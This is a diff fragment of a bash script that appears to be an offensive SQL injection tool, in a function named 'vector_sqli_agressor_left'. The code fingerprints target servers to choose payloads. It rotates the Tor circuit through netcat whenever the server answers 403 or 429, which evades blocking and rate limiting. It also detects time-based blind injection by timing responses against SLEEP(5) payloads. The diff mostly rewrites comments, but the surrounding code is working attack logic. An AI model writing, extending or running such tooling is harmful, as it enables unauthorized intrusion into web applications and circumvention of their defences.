@@ -95,7 +95,8 @@ vector_sqli_agressor_left() {
                 clean_target_url="${clean_target_url}/"
             fi
         fi
-
+        # This adjustment is sufficient. If the target server's performance is suboptimal,     
+        # the tamper script will be toned down to ensure it can at least be executed successfully.
         local active_payload=""
         if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
             active_payload="$t4"
@@ -177,6 +178,8 @@ vector_sqli_agressor_left() {
         stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
         http_status=$(echo "$curl_output" | cut -d'|' -f2)
 
+        # The underlying logic here is self-explanatory.
+        # If the server suddenly responds with a 403 or 429 status code, the script# immediately triggers a newnym signal utilizing netcat.
         if [[ "$http_status" == "403" || "$http_status" == "429" ]]; then
             echo -e "[\033[34m${current_time}\033[0m] [\033[1;34m!\033[0m] Port $random_port Shadowbanned [HTTP $http_status]. Rotating TOR IP Circuit..."
             (
@@ -187,12 +190,13 @@ vector_sqli_agressor_left() {
             sleep 1
         fi
 
-        # Its not important to have bc, but i suggest you to download one. It is more accurate
-        # But, dont worry, if you dont have it. It will fallback to awk, what type of linux OS that doesnt support awk?
+        # Note: While 'bc' is recommended for higher numerical precision, this script 
+        # dynamically falls back to 'awk' as a standard POSIX-compliant alternative.
+        # 
+        # The logic flags any response exceeding 4.5 seconds as a time-based anomaly,
+        # ensuring alignment with the 5-second delay mechanism (SLEEP(5)) used in the payloads.
         if [[ -n "$stopwatch" && "$stopwatch" != "0" && "$stopwatch" != "0.0" && "$stopwatch" != "0.000000" ]]; then
-            if command -v bc >/dev/null 2>&1; then
-                # If the duration exceeds 4.5 seconds, the server flags it as a time-based anomaly,
-                # given that all deployed payloads utilize a 5-second delay mechanism (SLEEP(5)).
+            if command -v bc >/dev/null 2>&1; then               
                 is_gt=$(echo "$stopwatch >= 4.5" | bc -l 2>/dev/null || echo 0)
             else
                 if awk -v sw="$stopwatch" 'BEGIN {exit !(sw >= 4.5)}'; then
